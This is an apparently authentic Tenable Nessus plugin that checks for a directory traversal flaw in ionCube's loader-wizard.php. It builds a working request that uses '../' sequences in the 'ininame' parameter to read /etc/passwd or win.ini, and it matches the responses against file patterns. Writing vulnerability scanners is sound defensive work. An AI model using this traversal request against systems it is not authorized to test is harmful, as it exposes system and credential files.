#%NASL_MIN_LEVEL 70300
#
# (C) Tenable Network Security, Inc.
#

include('deprecated_nasl_level.inc');
include('compat.inc');

if (description)
{
  script_id(73331);
  script_version("1.7");
  script_set_attribute(attribute:"plugin_modification_date", value:"2021/01/19");

  script_bugtraq_id(66531);

  script_name(english:"ionCube loader-wizard.php Remote Information Disclosure");
  script_summary(english:"Attempts to read a local file");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server hosts a PHP script that is affected by an
information disclosure vulnerability.");
  script_set_attribute(attribute:"description", value:
"The ionCube 'loader-wizard.php' script hosted on the remote web server
is affected by a remote information disclosure vulnerability because
the script fails to properly sanitize user-supplied input to the
'ininame' parameter. An attacker could potentially leverage this to
view arbitrary files by forming a request containing directory
traversal sequences.

Note that the 'loader-wizard.php' script is also reportedly affected
by additional information disclosure issues as well as a cross-site
scripting vulnerability; however, Nessus has not tested for these
additional issues.");
  # http://www.firefart.net/multiple-vulnerabilities-in-ioncube-loader-wizard/
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?9562db7d");
  script_set_attribute(attribute:"solution", value:
"Upgrade to version 2.46 or later and remove access to or remove the
'loader-wizard.php' script.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:U/RL:OF/RC:C");
  script_set_attribute(attribute:"cvss_score_source", value:"manual");
  script_set_attribute(attribute:"cvss_score_rationale", value:"information disclosure");

  script_set_attribute(attribute:"exploitability_ease", value:"No known exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"false");

  script_set_attribute(attribute:"vuln_publication_date", value:"2014/03/30");
  script_set_attribute(attribute:"patch_publication_date", value:"2014/03/04");
  script_set_attribute(attribute:"plugin_publication_date", value:"2014/04/04");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:ioncube:php_encoder");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2014-2021 and is owned by Tenable, Inc. or an Affiliate thereof.");

  script_dependencies("ioncube_loader_wizard_accessible.nasl", "os_fingerprint.nasl");
  script_require_keys("www/PHP", "www/ioncube");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");
include("data_protection.inc");

port = get_http_port(default:80, php:TRUE);

install = get_install_from_kb(
  appname : "ioncube",
  port    : port,
  exit_on_fail : TRUE
);

dir = install["dir"];
install_url = build_url(qs:dir + "/loader-wizard.php", port:port);

# Determine what to look for.
os = get_kb_item("Host/OS");
if (os && report_paranoia < 2)
{
  if ("Windows" >< os) files = make_list('windows/win.ini', 'winnt/win.ini');
  else files = make_list('etc/passwd');
}
else files = make_list('etc/passwd', 'windows/win.ini', 'winnt/win.ini');

file_pats = make_array();
file_pats['etc/passwd'] = "root:.*:0:[01]:";
file_pats['winnt/win.ini'] = "^\[[a-zA-Z]+\]|^; for 16-bit app support";
file_pats['windows/win.ini'] = "^\[[a-zA-Z]+\]|^; for 16-bit app support";

foreach file (files)
{
  vuln = FALSE;
  url = '?page=phpconfig&ininame=' + mult_str(str:"../", nb:12) + file +
    '&download=1';

  res = http_send_recv3(
    method : "GET",
    port   : port,
    item   : dir + '/loader-wizard.php' + url,
    exit_on_fail : TRUE
  );

  # If PHP on Windows was not compiled to set php_ini_scanned_files, the
  # 'Scan this dir for additional .ini files' of phpinfo() will be set to none
  # and the traversal attempt will instead return php.ini output instead of
  # our requested file
  if (file =~ 'win\\.ini$')
  {
    if (egrep(pattern:'^\\[PHP\\]|About php\\.ini', string:res[2]))
    {
      file = 'php.ini';
      url = '?page=phpconfig&ininame=' +file+ '&download=1';
      vuln = TRUE;
    }
  }
  if ( (!vuln) &&
    (egrep(pattern:file_pats[file], string:res[2]))
  ) vuln = TRUE;

  if (vuln)
  {
    report = NULL;
    attach_file = NULL;
    output = NULL;
    req = http_last_sent_request();
    request = NULL;

    if (report_verbosity > 0)
    {
      snip =  crap(data:"-", length:30)+' snip '+ crap(data:"-", length:30);
      report =
        '\n' + 'Nessus was able to exploit the issue to retrieve the contents of '+
        '\n' + "'" + file + "'" + ' using the following request :' +
        '\n' +
        '\n' + req +
        '\n';

      if (report_verbosity > 1)
      {
        output = data_protection::redact_etc_passwd(output:res[2]);
        attach_file = file;
        request = make_list(req);
      }
    }

    security_report_v4(port:port,
                       extra:report,
                       severity:SECURITY_WARNING,
                       request:request,
                       file:attach_file,
                       output:output);
    exit(0);
  }
}
audit(AUDIT_WEB_APP_NOT_AFFECTED, "ionCube", install_url);
